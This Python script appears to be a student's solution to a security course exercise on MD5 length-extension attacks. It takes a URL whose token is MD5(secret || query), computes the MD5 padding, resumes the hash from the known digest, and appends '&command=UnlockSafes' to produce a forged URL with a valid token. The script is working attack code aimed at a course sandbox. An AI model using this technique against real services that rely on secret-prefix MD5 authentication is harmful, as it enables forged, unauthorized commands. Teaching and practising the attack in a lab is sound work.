#!/usr/bin/python3

import sys
from urllib.parse import quote, urlparse
from pymd5 import md5, padding


##########################
# Example URL parsing code:
res = urlparse('https://project1.ecen4133.org/test/lengthextension/api?token=41bd1ccd26a75c282922c2b39cc3bb0a&command=Test1')
# res.query returns everything after '?' in the URL:
assert(res.query == 'token=41bd1ccd26a75c282922c2b39cc3bb0a&command=Test1')

###########################
# Example using URL quoting
# This is URL safe: a URL with %00 will be valid and interpreted as \x00
assert(quote('\x00\x01\x02') == '%00%01%02')

if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    # Get url from command line argument (argv)
    url = sys.argv[1]

    #################################
    # Your length extension code here
    len_pass = 8 #8 byte password
    extension = '&command=UnlockSafes'

    #get parts of url
    url_parse = urlparse(url)                       #parses url into different parts
    url_query = url_parse.query                     #gets everything after ? in the URL
    url_querylist = url_query.strip().split('&',1)  #list of 2 elements (token) and (commands)
    token = url_querylist[0].split("=")             #splits token to get the hex digest after '='
    last_digest = token[1]                          #takes the last digest
    iniurl = url.split('=')                         #takes the first part of url until token (without the '=')----for later when putting new url together

    #find padding needed
    len_m = len(url_querylist[1]) + len_pass        #(bytes) len of message(commands) + len of password
    bits = (len_m +len(padding(len_m*8)))*8         #(bits) how long message is + padding
    pad = quote(padding(len_m*8))                   #padding 

    #find digest of longer message with extension + padding
    h = md5(state=bytes.fromhex(last_digest), count=bits)   #start internal state of last digest
    h.update(extension)                                     #update with extension(append it)
    ext_digest = h.hexdigest()                              #get digest of longer message with extension
    
    #get new url with extension
    finalmsg = '&' + url_querylist[1] + pad + extension     #concatenate original message + padding + extension 
    finalurl = iniurl[0] + '=' + ext_digest + finalmsg      #concatenate original url api beginning + new digest + finalmsg
    
    #print the modified URL
    print(finalurl) 




